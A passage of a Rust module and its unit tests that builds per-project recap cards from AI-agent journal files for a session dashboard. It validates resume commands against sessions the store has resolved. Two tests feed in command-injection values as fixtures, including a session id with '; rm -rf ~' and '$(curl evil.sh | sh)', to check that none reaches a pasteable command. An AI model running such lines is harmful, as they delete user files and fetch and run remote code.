//! The board's journal-derived recap (ADR 0013): one card per project, built
//! from the Project Journal the agent wrote and the user answered.
//!
//! This module is the assembly, kept apart from the HTTP adapter so the
//! decisions it makes — which entry has the last word, whether a resume command
//! can be rendered, what a project with no prose falls back to — are observable
//! without a server. Reading the journal files and looking sessions up in the
//! store are the caller's, handed in as functions.

use std::cmp::Reverse;
use std::collections::{BTreeMap, HashSet};
use std::path::PathBuf;

use chrono::{DateTime, Utc};
use serde::Serialize;
use sessions::{
    project_slug, DeepLink, Handoff, Journal, JournalDay, JournalEntry, Session, Voice,
};

use crate::open::is_safe_session_id;

/// How many older journals the recap carries. The rest are counted but not
/// listed: the point of the list is that a question asked days ago is still
/// visible, and a page-long tail of calm projects buries exactly that.
pub const OLDER_LIMIT: usize = 5;

/// The recap payload: whether the journal is switched on at all, a card per
/// project the board knows a session for, and a line per project whose prose
/// outlived its sessions.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Recap {
    /// The `journal.enabled` toggle (ADR 0013). Carried rather than implied by an
    /// empty payload, because "the journal is off" and "nothing has been written
    /// yet" are different things and only one of them is the user's to fix.
    pub enabled: bool,
    pub cards: Vec<RecapCard>,
    /// Projects with prose on disk but no session the board still knows, newest
    /// first within a Handoff Status, capped at [`OLDER_LIMIT`].
    ///
    /// A card needs a working directory — to deep-link, to resume into — and a
    /// project known only by its journal has none, because the slug it is filed
    /// under cannot be turned back into a path. These are deliberately not
    /// cards: a line offers nothing to click, so having nowhere to click costs
    /// it nothing, and it can show the slug it really has rather than guess a
    /// display name out of it.
    pub older: Vec<OlderJournal>,
    /// How many there are in total, so a reader can say "5 of 12" rather than
    /// implying the list is everything. A cap nobody is told about would put
    /// back the blind spot this list exists to close.
    pub older_total: usize,
}

/// One project whose journal outlived the sessions that wrote it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct OlderJournal {
    /// The slug the journal is filed under — the whole of what is known about
    /// this project's identity, carried verbatim rather than cut down into a
    /// display name. `project_slug` collapses every run of non-alphanumerics,
    /// so `/Users/x/repos/attention-ledger` files under
    /// `users-x-repos-attention-ledger` and the last segment of that is
    /// `ledger`, which names nothing the user has. Presenting it is the
    /// reader's problem, and it should have the truth to work from.
    pub slug: String,
    pub handoff: Handoff,
    /// The single next best step, in the author's own prose. Untrusted text: it
    /// is data in this payload and nothing more.
    pub next: String,
    pub who: Voice,
    /// When the author says that last entry happened.
    pub at: DateTime<Utc>,
    /// How old that entry is. Never negative.
    pub age_seconds: i64,
    pub resume: OlderResume,
}

/// What is left of picking an older project's work back up.
///
/// The sentence and nothing else, because there is no directory to run a
/// command in — which is the whole reason these are lines and not cards. That
/// is exactly the case ADR 0013 and #57 describe: when no transcript can be
/// resolved, the instruction stands alone and the payload says why.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct OlderResume {
    /// The entry's own sentence for a fresh session, in the author's prose.
    pub instruction: String,
    /// The entry names a thread this machine cannot get back into. Always true
    /// when a thread was named at all: a project reachable through the store
    /// would have been a card, so anything reaching this list is past resuming.
    ///
    /// False only when the entry named no session — the first note in a journal
    /// answers no thread and never did, so nothing about it is missing. The
    /// same distinction the cards draw, for the same reason.
    pub session_gone: bool,
}

/// One project's card.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RecapCard {
    /// The project's display name — the last segment of its directory.
    pub project: String,
    /// The project directory, which is also what its journal is filed under.
    pub cwd: String,
    /// The journal's reading of this project, or `None` when there is no prose
    /// for it and the card falls back to the derived timeline.
    pub journal: Option<CardJournal>,
}

/// What the journal says about one project: the entry that had the last word,
/// plus the days it finished work on.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CardJournal {
    pub handoff: Handoff,
    /// The single next best step, in the author's own prose. Untrusted text: it
    /// is data in this payload and nothing more.
    pub next: String,
    /// Finished work grouped by day, newest day first.
    pub days: Vec<JournalDay>,
    /// The Agent Session that had the last word, and who spoke it. A `who` of
    /// `user` means the last word is a correction no agent has answered yet.
    pub session: String,
    pub who: Voice,
    /// When the author says that last entry happened.
    pub at: DateTime<Utc>,
    /// How old that entry is — the card's "latest 2h ago" label. Never negative.
    pub age_seconds: i64,
    pub resume: CardResume,
}

/// How the card offers to pick the work back up.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CardResume {
    /// The entry's own sentence for a fresh session, in the author's prose.
    pub instruction: String,
    /// The runnable form, for the human to copy — Riku never runs it. Built here
    /// from the session the store resolved, never from anything the record said.
    pub command: Option<String>,
    /// The directory that command belongs in.
    pub dir: Option<String>,
    /// The entry names a session this machine cannot get back into, so the
    /// instruction stands alone — the transcript is gone, or it has no working
    /// directory to resume in, or its id is not one the board would launch.
    /// One marker for all three because a reader can act on them identically:
    /// the thread is not re-enterable, and the sentence is what is left.
    ///
    /// Not the same as an entry that named no session at all, which is what the
    /// first note in a journal looks like.
    pub session_gone: bool,
}

/// Build the recap.
///
/// `read_journal`, `list_journals` and `find_session` are the three reads this
/// needs: a project's journal by slug, every project with a journal on disk,
/// and a session by the id an entry names. All are handed in so the assembly
/// can be exercised against fixtures.
///
/// The two halves of the payload are keyed differently on purpose. Cards come
/// from the store, so every card has a real directory and a resumable thread.
/// The older list comes from the filesystem, because prose outlives the
/// transcript it was written beside: the store forgets a project 24 hours after
/// its last session ([`sessions::DISCOVERY_WINDOW`]), and a question the agent
/// asked three days ago is exactly the thing a recap must not lose.
pub fn recap(
    sessions: &[Session],
    enabled: bool,
    read_journal: impl Fn(&str) -> Journal,
    list_journals: impl Fn() -> Vec<(String, DateTime<Utc>)>,
    find_session: impl Fn(&str) -> Option<(PathBuf, Session)>,
    now: DateTime<Utc>,
) -> Recap {
    // Each card is carried with the project's real last activity, which is the
    // tiebreak below and has no place in the payload itself.
    let mut cards: Vec<(DateTime<Utc>, RecapCard)> = Vec::new();
    for (cwd, project, last_event_at) in projects(sessions) {
        // Off means untouched, not merely unrendered. The journal is the most
        // sensitive thing Riku keeps, and a board serving a recap nobody opted
        // into has no business opening the file to discover there is one.
        let reading = enabled
            .then(|| read_journal(&project_slug(std::path::Path::new(&cwd))))
            .and_then(|journal| journal.resolve(None));
        let journal = reading.map(|reading| CardJournal {
            handoff: reading.latest.handoff,
            next: reading.latest.next.clone(),
            days: reading.days.clone(),
            session: reading.latest.session.clone(),
            who: reading.latest.who,
            at: reading.latest.at,
            age_seconds: reading.age(now).num_seconds(),
            resume: resume(&reading.latest, &find_session),
        });
        cards.push((
            last_event_at,
            RecapCard {
                project,
                cwd,
                journal,
            },
        ));
    }

    // Card order is ADR 0013's: the effort that wants a human comes first, and
    // `Handoff`'s declaration order already is that order, so the Handoff Status
    // sorts itself. A project with no prose has none to sort by and goes last —
    // it is on the board to be complete, not because it is asking for anything.
    //
    // Within a Handoff Status the newest project comes first, measured by the store's
    // `last_event_at` rather than the entry's `at`. `at` is agent-supplied and
    // nothing enforces it, so keying the order on it would let one entry stamped
    // in the year 3000 hold the top of its group forever — the same reason
    // `Journal` refuses to resolve recency from it.
    cards.sort_by_key(|(last_event_at, card)| {
        let handoff = card.journal.as_ref().map(|journal| journal.handoff);
        (handoff.is_none(), handoff, Reverse(*last_event_at))
    });

    // Off means untouched here too: a board serving a recap nobody opted into
    // has no more business enumerating the journal directory than opening the
    // files in it.
    let (older, older_total) = match enabled {
        true => older_journals(&cards, &read_journal, &list_journals, now),
        false => (Vec::new(), 0),
    };
    Recap {
        enabled,
        cards: cards.into_iter().map(|(_, card)| card).collect(),
        older,
        older_total,
    }
}

/// The projects whose prose outlived their sessions: every journal on disk that
/// no card already speaks for, ordered and capped.
///
/// Returns the capped list and the total, because the reader has to be able to
/// say how many were left out.
fn older_journals(
    cards: &[(DateTime<Utc>, RecapCard)],
    read_journal: &impl Fn(&str) -> Journal,
    list_journals: &impl Fn() -> Vec<(String, DateTime<Utc>)>,
    now: DateTime<Utc>,
) -> (Vec<OlderJournal>, usize) {
    // A project the board holds a session for is already a card, and a card
    // says strictly more than a line — the same journal must not appear twice.
    let carded: HashSet<String> = cards
        .iter()
        .map(|(_, card)| project_slug(std::path::Path::new(&card.cwd)))
        .collect();

    let mut older: Vec<(DateTime<Utc>, OlderJournal)> = list_journals()
        .into_iter()
        .filter(|(slug, _)| !carded.contains(slug))
        .filter_map(|(slug, written)| {
            // A journal that parses to nothing is not an older project, it is
            // an empty file — the same "no prose" case a card falls back on.
            let reading = read_journal(&slug).resolve(None)?;
            Some((
                written,
                OlderJournal {
                    slug,
                    handoff: reading.latest.handoff,
                    next: reading.latest.next.clone(),
                    who: reading.latest.who,
                    at: reading.latest.at,
                    age_seconds: reading.age(now).num_seconds(),
                    resume: OlderResume {
                        instruction: reading.latest.resume.instruction.clone(),
                        session_gone: !reading.latest.session.is_empty(),
                    },
                },
            ))
        })
        .collect();

    // The cards' order, for the same reasons: Handoff Status first, so the cap can
    // never drop a question in favour of something calm; then recency by the
    // file's own mtime rather than the entry's `at`, which is agent-supplied
    // and would let one entry stamped in the year 3000 sit at the top of the
    // list forever — and, now that the list is capped, push a real question off
    // the end of it.
    older.sort_by_key(|(written, journal)| (journal.handoff, Reverse(*written)));
    let older_total = older.len();
    older.truncate(OLDER_LIMIT);
    (
        older.into_iter().map(|(_, journal)| journal).collect(),
        older_total,
    )
}

/// How the card offers to pick one entry's work back up.
///
/// The instruction is the record's; the command is Riku's. `find_session` is
/// asked for the session the entry names, and everything runnable — the tool,
/// the id, the directory — is read off the session it hands back, never off the
/// record. So a record naming a session this machine cannot resolve yields no
/// command at all, which is exactly why the record carries no command string of
/// its own (ADR 0013): validation falls out of resolution instead of having to
/// be bolted onto a string somebody else wrote.
fn resume(
    entry: &JournalEntry,
    find_session: &impl Fn(&str) -> Option<(PathBuf, Session)>,
) -> CardResume {
    let instruction = entry.resume.instruction.clone();
    // An entry that named no session is not an entry whose session went missing.
    // The first note in a journal answers no thread, and never did.
    if entry.session.is_empty() {
        return CardResume {
            instruction,
            command: None,
            dir: None,
            session_gone: false,
        };
    }
    let link = find_session(&entry.session)
        // A transcript can claim any `sessionId` it likes and the store repeats
        // it faithfully. `POST …/open` already refuses to launch an id that is
        // not a plain one; a command offered for the user to paste into their
        // own shell has to clear the same bar, or the guard only covers the
        // button and not the copy.
        .filter(|(_, session)| is_safe_session_id(&session.id))
        .and_then(|(transcript, session)| {
            DeepLink::resume(
                session.tool,
                &session.id,
                session.cwd.as_deref(),
                &transcript,
            )
        });
    match link {
        // Display-only text, for the human to copy. Riku never runs it — not
        // remotely (ADR 0002) and not locally either.
        Some(link) => CardResume {
            instruction,
            command: Some(format!("{} {}", link.program, link.args.join(" "))),
            dir: Some(link.dir.to_string_lossy().into_owned()),
            session_gone: false,
        },
        None => CardResume {
            instruction,
            command: None,
            dir: None,
            session_gone: true,
        },
    }
}

/// The projects the board knows a session for: each distinct working directory,
/// with the display name its sessions carry and the latest moment any of them
/// was active.
///
/// A session with no known `cwd` names no project — it has no directory to file
/// a journal under and none to resume into — so it contributes no card. Its own
/// card on the board is unaffected; the recap simply has nothing to say about it.
fn projects(sessions: &[Session]) -> Vec<(String, String, DateTime<Utc>)> {
    let mut projects: BTreeMap<String, (String, DateTime<Utc>)> = BTreeMap::new();
    for session in sessions {
        let Some(cwd) = session.cwd.clone() else {
            continue;
        };
        let entry = projects
            .entry(cwd)
            .or_insert_with(|| (session.project.clone(), session.last_event_at));
        entry.1 = entry.1.max(session.last_event_at);
    }
    projects
        .into_iter()
        .map(|(cwd, (project, last_event_at))| (cwd, project, last_event_at))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::TimeZone;
    use sessions::{Status, SubAgents, Tool};

    const CWD: &str = "/Users/x/repos/foo";

    fn at(h: u32) -> DateTime<Utc> {
        Utc.with_ymd_and_hms(2026, 7, 27, h, 0, 0).unwrap()
    }

    /// A local session in `cwd`, as the store would hand it over.
    fn session(id: &str, cwd: &str, last_event_at: DateTime<Utc>) -> Session {
        Session {
            id: id.to_string(),
            tool: Tool::Claude,
            project: cwd.rsplit('/').next().unwrap_or_default().to_string(),
            model: None,
            branch: None,
            cwd: Some(cwd.to_string()),
            tokens_in: 0,
            tokens_out: 0,
            activity: None,
            last_event_at,
            status: Status::Active,
            attention: None,
            cost_usd: None,
            diff: None,
            sub_agents: SubAgents::default(),
            machine: None,
        }
    }

    /// One agent journal line for `project`, as the stop hook writes it.
    fn agent_line(
        project: &str,
        session: &str,
        at: DateTime<Utc>,
        handoff: &str,
        done: &str,
        next: &str,
    ) -> String {
        serde_json::json!({
            "v": 1, "project": project, "session": session,
            "at": at.to_rfc3339(), "who": "agent", "handoff": handoff,
            "done": [done], "next": next,
            "resume": { "instruction": "pick it up where it stopped" },
        })
        .to_string()
    }

    /// The slug a project directory's journal is filed under.
    fn slug(cwd: &str) -> String {
        project_slug(std::path::Path::new(cwd))
    }

    /// A journal reader over fixture text, keyed by the project *directory* the
    /// journal belongs to. A directory with no fixture reads as empty, which is
    /// what an absent journal file looks like.
    fn journals(fixtures: Vec<(&str, String)>) -> impl Fn(&str) -> Journal {
        let by_slug: BTreeMap<String, String> = fixtures
            .into_iter()
            .map(|(cwd, text)| (slug(cwd), text))
            .collect();
        move |wanted: &str| match by_slug.get(wanted) {
            Some(text) => Journal::parse(wanted, text),
            None => Journal::default(),
        }
    }

    /// A journal reader over one project directory's text.
    fn journal_of(cwd: &str, text: String) -> impl Fn(&str) -> Journal {
        journals(vec![(cwd, text)])
    }

    /// A store that knows nothing — every entry's session reads as gone.
    fn no_sessions(_: &str) -> Option<(PathBuf, Session)> {
        None
    }

    /// A journal directory with nothing in it: every project the recap sees is
    /// one the store handed over.
    fn no_journals() -> Vec<(String, DateTime<Utc>)> {
        Vec::new()
    }

    /// A journal directory listing, keyed by project *directory* and stamped
    /// with the moment each file was last written — which is what the store's
    /// `last_event_at` is to a card, and what the ordering is keyed on.
    fn listing(files: Vec<(&str, DateTime<Utc>)>) -> impl Fn() -> Vec<(String, DateTime<Utc>)> {
        let listed: Vec<(String, DateTime<Utc>)> = files
            .into_iter()
            .map(|(cwd, written)| (slug(cwd), written))
            .collect();
        move || listed.clone()
    }

    /// A store that resolves exactly these sessions by id, the way the Engine
    /// does: the transcript path comes with the session, never from the caller.
    fn store(known: Vec<Session>) -> impl Fn(&str) -> Option<(PathBuf, Session)> {
        move |wanted: &str| {
            known
                .iter()
                .find(|session| session.id == wanted)
                .map(|session| {
                    (
                        PathBuf::from(format!("/transcripts/{}.jsonl", session.id)),
                        session.clone(),
                    )
                })
        }
    }

    #[test]
    fn a_project_with_a_journal_gets_a_card_carrying_its_last_word() {
        let text = agent_line(
            &slug(CWD),
            "sess-1",
            at(9),
            "needs-review",
            "Wrote the recap endpoint",
            "Review it",
        );

        let recap = recap(
            &[session("sess-1", CWD, at(9))],
            true,
            journal_of(CWD, text),
            no_journals,
            no_sessions,
            at(11),
        );

        assert!(recap.enabled);
        assert_eq!(recap.cards.len(), 1, "one card per project: {:?}", recap);
        let card = &recap.cards[0];
        assert_eq!(card.project, "foo");
        assert_eq!(card.cwd, CWD);

        let journal = card.journal.as_ref().expect("the project has prose");
        assert_eq!(journal.handoff, Handoff::NeedsReview);
        assert_eq!(journal.next, "Review it");
        assert_eq!(journal.session, "sess-1");
        assert_eq!(journal.who, Voice::Agent);
        assert_eq!(journal.at, at(9));
        assert_eq!(journal.days.len(), 1);
        assert_eq!(journal.days[0].done, vec!["Wrote the recap endpoint"]);
        assert_eq!(
            journal.age_seconds,
            2 * 60 * 60,
            "the card's `latest 2h ago` label"
        );
        assert_eq!(journal.resume.instruction, "pick it up where it stopped");
    }

    #[test]
    fn cards_are_ordered_by_handoff_status_not_by_project_name() {
        // Directory order would put these the other way round, which is exactly
        // what the board must not do: the effort that wants a human comes first.
        let calm = "/Users/x/repos/aaa";
        let waiting = "/Users/x/repos/zzz";
        let reviewing = "/Users/x/repos/mmm";

        let recap = recap(
            &[
                session("s-calm", calm, at(9)),
                session("s-waiting", waiting, at(9)),
                session("s-reviewing", reviewing, at(9)),
            ],
            true,
            journals(vec![
                (
                    calm,
                    agent_line(&slug(calm), "s-calm", at(9), "on-track", "Done", "Carry on"),
                ),
                (
                    waiting,
                    agent_line(
                        &slug(waiting),
                        "s-waiting",
                        at(9),
                        "needs-you",
                        "Half of it",
                        "Which format?",
                    ),
                ),
                (
                    reviewing,
                    agent_line(
                        &slug(reviewing),
                        "s-reviewing",
                        at(9),
                        "needs-review",
                        "All of it",
                        "Look it over",
                    ),
                ),
            ]),
            no_journals,
            no_sessions,
            at(11),
        );

        let order: Vec<Handoff> = recap
            .cards
            .iter()
            .map(|card| card.journal.as_ref().expect("all three have prose").handoff)
            .collect();
        assert_eq!(
            order,
            vec![Handoff::NeedsYou, Handoff::NeedsReview, Handoff::OnTrack]
        );
    }

    #[test]
    fn cards_at_the_same_handoff_status_are_broken_by_real_activity_not_the_stamped_time() {
        // Two projects equally in needs-you. `at` is agent-supplied and nothing
        // enforces it, so one entry stamped in the year 3000 must not shoulder a
        // genuinely more recent project off the top of its own Handoff Status group.
        // The tiebreak is the store's `last_event_at`, which the filesystem
        // enforces. Directory order would also get this wrong, the other way.
        let stale = "/Users/x/repos/aaa";
        let busy = "/Users/x/repos/bbb";
        let year_3000 = Utc.with_ymd_and_hms(3000, 1, 1, 9, 0, 0).unwrap();

        let recap = recap(
            &[
                session("s-stale", stale, at(9)),
                session("s-busy", busy, at(11)),
            ],
            true,
            journals(vec![
                (
                    stale,
                    agent_line(
                        &slug(stale),
                        "s-stale",
                        year_3000,
                        "needs-you",
                        "Claimed",
                        "Answer me",
                    ),
                ),
                (
                    busy,
                    agent_line(&slug(busy), "s-busy", at(8), "needs-you", "Real", "And me"),
                ),
            ]),
            no_journals,
            no_sessions,
            at(12),
        );

        let order: Vec<&str> = recap.cards.iter().map(|card| card.cwd.as_str()).collect();
        assert_eq!(order, vec![busy, stale]);
    }

    #[test]
    fn a_project_with_no_usable_prose_falls_back_instead_of_fabricating_it() {
        // Three ways a project ends up with nothing to say: no journal file at
        // all (the ordinary case — the feature is opt-in and this agent was
        // never wired with the hook), an empty one, and one whose every line is
        // garbage. None of them is an error, and none of them invents prose.
        let wired = "/Users/x/repos/aaa";
        let unwired = "/Users/x/repos/bbb";
        let corrupt = "/Users/x/repos/ccc";

        let recap = recap(
            &[
                session("s-wired", wired, at(9)),
                session("s-unwired", unwired, at(11)),
                session("s-corrupt", corrupt, at(10)),
            ],
            true,
            journals(vec![
                (
                    wired,
                    agent_line(&slug(wired), "s-wired", at(9), "on-track", "Work", "More"),
                ),
                (corrupt, "not json at all\n{\n".to_string()),
            ]),
            no_journals,
            no_sessions,
            at(12),
        );

        assert_eq!(recap.cards.len(), 3, "every known project gets a card");
        // The one with prose leads even though it is the least recently active:
        // a card that can say something outranks one that cannot.
        assert_eq!(recap.cards[0].cwd, wired);
        assert!(recap.cards[0].journal.is_some());
        for card in &recap.cards[1..] {
            assert!(
                card.journal.is_none(),
                "{} should carry no prose: {card:?}",
                card.cwd
            );
        }
        // Fallback cards keep the newest-first tiebreak among themselves.
        assert_eq!(recap.cards[1].cwd, unwired);
        assert_eq!(recap.cards[2].cwd, corrupt);
    }

    #[test]
    fn a_session_with_no_working_directory_is_not_a_project() {
        // No directory means no journal to file and nowhere to resume into. Its
        // own card on the board is unaffected; the recap just has nothing to say.
        let mut homeless = session("s-homeless", CWD, at(9));
        homeless.cwd = None;

        let recap = recap(
            &[homeless],
            true,
            journals(vec![]),
            no_journals,
            no_sessions,
            at(10),
        );
        assert!(recap.cards.is_empty(), "{:?}", recap.cards);
    }

    /// The one journal card in a recap, failing loudly if the shape is not what
    /// the test set up.
    fn only_journal(recap: &Recap) -> &CardJournal {
        assert_eq!(recap.cards.len(), 1, "{:?}", recap.cards);
        recap.cards[0]
            .journal
            .as_ref()
            .expect("the fixture project has prose")
    }

    #[test]
    fn a_resumable_thread_gets_a_command_riku_built_itself() {
        let live = session("sess-1", CWD, at(9));
        let recap = recap(
            std::slice::from_ref(&live),
            true,
            journal_of(
                CWD,
                agent_line(&slug(CWD), "sess-1", at(9), "needs-you", "Half", "Ask"),
            ),
            no_journals,
            store(vec![live.clone()]),
            at(10),
        );

        let resume = &only_journal(&recap).resume;
        // The record carries an instruction and nothing else; the runnable form
        // is assembled here, from the tool and id the store resolved.
        assert_eq!(resume.instruction, "pick it up where it stopped");
        assert_eq!(resume.command.as_deref(), Some("claude --resume sess-1"));
        assert_eq!(resume.dir.as_deref(), Some(CWD));
        assert!(!resume.session_gone);
    }

    #[test]
    fn the_command_follows_the_tool_the_store_knows_not_the_record() {
        // Nothing in a journal record says which CLI wrote it. The resume form
        // is the store's to decide, and Codex resumes by a different verb.
        let mut live = session("rollout-1", CWD, at(9));
        live.tool = Tool::Codex;

        let recap = recap(
            &[live.clone()],
            true,
            journal_of(
                CWD,
                agent_line(&slug(CWD), "rollout-1", at(9), "on-track", "Work", "More"),
            ),
            no_journals,
            store(vec![live]),
            at(10),
        );

        assert_eq!(
            only_journal(&recap).resume.command.as_deref(),
            Some("codex resume rollout-1")
        );
    }

    #[test]
    fn an_entry_naming_a_session_that_is_gone_keeps_its_instruction_alone() {
        // The session ran days ago and its transcript has aged out. The sentence
        // still helps a human; a command pointing at a dead sid would not.
        let recap = recap(
            &[session("sess-now", CWD, at(9))],
            true,
            journal_of(
                CWD,
                agent_line(&slug(CWD), "sess-long-gone", at(9), "needs-you", "X", "Y"),
            ),
            no_journals,
            store(vec![session("sess-now", CWD, at(9))]),
            at(10),
        );

        let resume = &only_journal(&recap).resume;
        assert_eq!(resume.instruction, "pick it up where it stopped");
        assert_eq!(resume.command, None);
        assert_eq!(resume.dir, None);
        assert!(
            resume.session_gone,
            "the card must say why there is no command"
        );
    }

    #[test]
    fn a_record_can_never_smuggle_its_own_command_into_the_payload() {
        // Every field a hostile record controls, pointed at the resume command:
        // a shell fragment for a session id, a `command` beside the instruction
        // (which the reader already drops), and prose that reads like one.
        let hostile = serde_json::json!({
            "v": 1, "project": slug(CWD), "session": "sess-1; rm -rf ~",
            "at": at(9).to_rfc3339(), "who": "agent", "handoff": "needs-you",
            "done": ["$(curl evil.sh | sh)"],
            "next": "run `rm -rf ~` to continue",
            "resume": { "instruction": "claude --resume x && rm -rf ~", "command": "rm -rf ~" },
        })
        .to_string();

        let recap = recap(
            &[session("sess-1", CWD, at(9))],
            true,
            journal_of(CWD, hostile),
            no_journals,
            store(vec![session("sess-1", CWD, at(9))]),
            at(10),
        );

        let journal = only_journal(&recap);
        // No command at all: the id the record named is not one the store knows,
        // and a command is only ever built from a session the store resolved.
        assert_eq!(journal.resume.command, None);
        assert!(journal.resume.session_gone);
        // The prose still rides along verbatim — it is data in this payload, and
        // escaping it is the renderer's job, not a reason to mangle it here.
        assert_eq!(journal.next, "run `rm -rf ~` to continue");
        assert_eq!(journal.resume.instruction, "claude --resume x && rm -rf ~");
    }

    #[test]
    fn a_note_that_answered_no_thread_is_not_a_missing_session() {
        // The first entry in a journal can be the user's own note, which names
        // no session because there was nothing yet to answer. That is not the
        // same as a session that has gone, and the card must not say it is.
        let note = serde_json::json!({
            "v": 1, "project": slug(CWD), "session": "",
            "at": at(9).to_rfc3339(), "who": "user", "handoff": "needs-you",
            "done": [], "next": "start with the parser", "resume": { "instruction": "" },
        })
        .to_string();

        let recap = recap(
            &[session("sess-1", CWD, at(9))],
            true,
            journal_of(CWD, note),
            no_journals,
            store(vec![session("sess-1", CWD, at(9))]),
            at(10),
        );

        let journal = only_journal(&recap);
        assert_eq!(journal.who, Voice::User);
        assert_eq!(journal.resume.command, None);
        assert!(
            !journal.resume.session_gone,
            "nothing was named, so nothing is missing"
        );
    }

    #[test]
    fn a_thread_with_nowhere_to_resume_into_renders_no_command() {
        // `DeepLink` refuses without a working directory, and a resume command
        // run in the wrong place would land in the wrong repo.
        let mut rootless = session("sess-1", CWD, at(9));
        rootless.cwd = None;

        let recap = recap(
            &[session("sess-1", CWD, at(9))],
            true,
            journal_of(
                CWD,
                agent_line(&slug(CWD), "sess-1", at(9), "needs-you", "X", "Y"),
            ),
            no_journals,
            store(vec![rootless]),
            at(10),
        );

        let resume = &only_journal(&recap).resume;
        assert_eq!(resume.command, None);
        assert!(resume.session_gone);
    }

    #[test]
    fn a_session_id_the_board_would_not_launch_is_not_one_it_hands_over_either() {
        // A transcript can claim any `sessionId` it likes, and the store repeats
        // it. The open endpoint already refuses to launch an id that is not a
        // plain one; a command offered for the user to paste into their own
        // shell has to clear the same bar, or the guard only covers the button.
        let odd = "sess-1; rm -rf ~";
        let recap = recap(
            &[session(odd, CWD, at(9))],
            true,
            journal_of(
                CWD,
                agent_line(&slug(CWD), odd, at(9), "needs-you", "X", "Y"),
            ),
            no_journals,
            store(vec![session(odd, CWD, at(9))]),
            at(10),
        );

        let resume = &only_journal(&recap).resume;
        assert_eq!(resume.command, None, "nothing pasteable is offered");
        assert!(resume.session_gone);
    }

    #[test]
    fn a_journal_that_outlived_its_sessions_is_still_on_the_board() {
        // The store forgets a project 24h after its last session, but the prose
        // stays on disk. A question the agent asked three days ago is exactly
        // what a recap must not lose, so it comes back as a line — no cwd to
        // deep-link into and none needed, because a line offers nothing to
        // click.
        let gone = "/Users/x/repos/attention-ledger";

        let recap = recap(
            &[session("sess-1", CWD, at(9))],
            true,
            journals(vec![
                (
                    CWD,
                    agent_line(&slug(CWD), "sess-1", at(9), "on-track", "Work", "More"),
                ),
                (
                    gone,
                    agent_line(
                        &slug(gone),
                        "sess-old",
                        at(9),
                        "needs-you",
                        "Drafted ADR 0012",
                        "SQLite or flat JSONL?",
                    ),
                ),
            ]),
            listing(vec![(CWD, at(9)), (gone, at(8))]),
            no_sessions,
            at(11),
        );

        assert_eq!(recap.cards.len(), 1, "only the live project is a card");
        assert_eq!(recap.cards[0].cwd, CWD);

        assert_eq!(recap.older_total, 1);
        assert_eq!(recap.older.len(), 1, "{:?}", recap.older);
        let older = &recap.older[0];
        // The slug rides out whole. Cut to its last segment it would read
        // "ledger", which names nothing the user has.
        assert_eq!(older.slug, slug(gone));
        assert_eq!(older.handoff, Handoff::NeedsYou);
        assert_eq!(older.next, "SQLite or flat JSONL?");
        assert_eq!(older.who, Voice::Agent);
        assert_eq!(older.at, at(9));
        assert_eq!(older.age_seconds, 2 * 60 * 60);
        // The sentence is what survives: there is no directory to run a command
        // in, and the payload says why rather than leaving the reader to guess.
        assert_eq!(older.resume.instruction, "pick it up where it stopped");
        assert!(older.resume.session_gone);
    }

    #[test]
    fn an_older_note_that_answered_no_thread_is_not_a_missing_session() {
        // The same distinction the cards draw. The first entry in a journal can
        // be the user's own note, which names no session because there was
        // nothing yet to answer — that is not a thread that has gone, and a
        // line must not claim it is just because it is old.
        let quiet = "/Users/x/repos/quiet";
        let note = serde_json::json!({
            "v": 1, "project": slug(quiet), "session": "",
            "at": at(9).to_rfc3339(), "who": "user", "handoff": "needs-you",
            "done": [], "next": "start with the parser", "resume": { "instruction": "" },
        })
        .to_string();

        let recap = recap(
            &[],
            true,
            journals(vec![(quiet, note)]),
            listing(vec![(quiet, at(9))]),
            no_sessions,
            at(10),
        );

        assert_eq!(recap.older.len(), 1, "{:?}", recap.older);
        assert_eq!(recap.older[0].who, Voice::User);
        assert!(
            !recap.older[0].resume.session_gone,
            "nothing was named, so nothing is missing"
        );
    }

    #[test]
    fn a_project_the_store_still_knows_is_a_card_and_never_a_line_as_well() {
        // Its journal is on disk like any other, so the listing offers it — but
        // a card says strictly more than a line, and the same project appearing
        // twice would read as two pieces of work.
        let recap = recap(
            &[session("sess-1", CWD, at(9))],
            true,
            journal_of(
                CWD,
                agent_line(&slug(CWD), "sess-1", at(9), "needs-you", "X", "Y"),
            ),
            listing(vec![(CWD, at(9))]),
            no_sessions,
            at(10),
        );

        assert_eq!(recap.cards.len(), 1);
        assert!(
            recap.older.is_empty() && recap.older_total == 0,
            "the carded project must not be listed again: {:?}",
            recap.older
        );
    }

    #[test]
    fn the_older_list_is_capped_and_the_cap_drops_the_calmest_never_a_question() {
        // Seven journals, all out of window, deliberately ordered so directory
        // order and recency both disagree with the answer: the one question is
        // the *oldest* file of the seven. It must survive the cap; the two that
        // fall off must be the calm ones.
        let asking = "/Users/x/repos/asks";
        let reviews: Vec<String> = (0..4).map(|n| format!("/Users/x/repos/rev{n}")).collect();
        let calm: Vec<String> = (0..2).map(|n| format!("/Users/x/repos/calm{n}")).collect();

        let mut fixtures = vec![(
            asking,
            agent_line(&slug(asking), "s", at(9), "needs-you", "Half", "Answer me"),
        )];
        let mut listed = vec![(asking, at(1))]; // oldest file of the seven
        for (n, dir) in reviews.iter().enumerate() {
            fixtures.push((
                dir.as_str(),
                agent_line(&slug(dir), "s", at(9), "needs-review", "Done", "Look"),
            ));
            listed.push((dir.as_str(), at(10 + n as u32)));
        }
        for (n, dir) in calm.iter().enumerate() {
            fixtures.push((
                dir.as_str(),
                agent_line(&slug(dir), "s", at(9), "on-track", "Done", "Carry on"),
            ));
            // The calmest are also the most recently written, so only the
            // Handoff Status ordering can keep them out of the cap.
            listed.push((dir.as_str(), at(20 + n as u32)));
        }

        let recap = recap(
            &[],
            true,
            journals(fixtures),
            listing(listed),
            no_sessions,
            at(23),
        );

        assert_eq!(recap.older_total, 7, "the total counts every journal");
        assert_eq!(recap.older.len(), OLDER_LIMIT, "{:?}", recap.older);
        assert_eq!(
            recap.older[0].slug,
            slug(asking),
            "the question leads, though its file is the oldest of the seven"
        );
